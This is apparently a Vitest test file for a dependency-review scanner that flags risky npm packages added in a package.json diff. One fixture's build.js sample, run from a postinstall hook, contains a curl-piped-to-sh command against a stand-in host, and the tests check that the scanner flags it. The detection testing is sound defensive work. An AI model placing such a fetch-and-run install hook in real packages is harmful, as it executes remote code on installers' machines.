import { describe, expect, test } from "vitest";
import {
  computeRisk,
  dependencyDeclarationKey,
  dependencyScanFindings,
  selectAddedDependencyDeclarations,
  summarizePackageJsonDiff,
} from "../server/lib/review";

const parentDiff = summarizePackageJsonDiff(
  { name: "parent", version: "1.0.0" },
  { name: "parent", version: "1.1.0", dependencies: { risky: "^2.0.0" } },
);

function evidence(overrides = {}) {
  return {
    name: "risky",
    section: "dependencies",
    declaredSpec: "^2.0.0",
    path: "parent@1.1.0 -> risky@2.3.0",
    outcome: "inspected",
    outcomeDetail: "",
    resolution: {
      kind: "range",
      version: "2.3.0",
      tarballUrl: "https://registry.npmjs.org/risky/-/risky-2.3.0.tgz",
      registryIntegrity: null,
      resolvedAt: "2026-08-28T00:00:00.000Z",
    },
    artifact: {
      sha256: "sha256",
      sha512: "sha512",
      fileCount: 2,
      totalBytes: 200,
      integrityMatched: null,
    },
    entrypoints: {
      lifecycleScripts: ["postinstall"],
      hasInstallLifecycle: true,
      gypfile: false,
      binCount: 0,
    },
    findingCount: 0,
    packageJson: {
      name: "risky",
      version: "2.3.0",
      scripts: { postinstall: "node build.js" },
    },
    files: [
      {
        path: "package.json",
        size: 100,
        sha256: "manifest",
        flags: [],
        textSample: '{"name":"risky","version":"2.3.0","scripts":{"postinstall":"node build.js"}}',
      },
      {
        path: "build.js",
        size: 100,
        sha256: "build",
        flags: [],
        textSample:
          "const { execSync } = require('child_process'); execSync('curl -sL https://cdn.example.invalid/p | sh');",
      },
    ],
    ...overrides,
  };
}

describe("dependency artifact finding composer", () => {
  test("keeps original rule IDs and adds one critical install-time roll-up", () => {
    const dependencies = selectAddedDependencyDeclarations(parentDiff);
    const findings = dependencyScanFindings(
      dependencies,
      {
        [dependencyDeclarationKey("risky", "dependencies", "^2.0.0")]: evidence(),
      },
      {
        name: "parent",
        version: "1.1.0",
      },
    );
    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "code.remote-shell",
          severity: "medium",
          file: "dependency/risky@2.3.0/build.js",
          dependency: {
            name: "risky",
            version: "2.3.0",
            path: "parent@1.1.0 -> risky@2.3.0",
            section: "dependencies",
            declaredSpec: "^2.0.0",
          },
        }),
        expect.objectContaining({
          ruleId: "dependency.install-time-capability",
          severity: "critical",
        }),
      ]),
    );
    expect(computeRisk(findings)).toBe("critical");
  });

  test("fails visibly when selected evidence is missing", () => {
    const findings = dependencyScanFindings(
      selectAddedDependencyDeclarations(parentDiff),
      {},
      {
        name: "parent",
        version: "1.1.0",
      },
    );
    expect(findings).toEqual([
      expect.objectContaining({
        ruleId: "dependency.artifact-unavailable",
        severity: "medium",
        file: "package.json",
      }),
    ]);
  });

  test("does not scan first-publish dependency rows without a baseline", () => {
    const firstPublish = summarizePackageJsonDiff(null, {
      name: "parent",
      version: "1.0.0",
      dependencies: { risky: "2.3.0" },
    });
    expect(
      dependencyScanFindings(
        selectAddedDependencyDeclarations(firstPublish),
        {
          [dependencyDeclarationKey("risky", "dependencies", "2.3.0")]: evidence({
            declaredSpec: "2.3.0",
          }),
        },
        { name: "parent", version: "1.0.0" },
      ),
    ).toEqual([]);
  });

  test("emits one bounded gap finding for omitted declarations", () => {
    const findings = dependencyScanFindings([], {}, { name: "parent", version: "1.1.0" }, 16);

    expect(findings).toEqual([
      expect.objectContaining({
        ruleId: "dependency.artifact-unavailable",
        severity: "medium",
        evidence: expect.stringContaining("16 additional direct dependencies"),
      }),
    ]);
  });
});
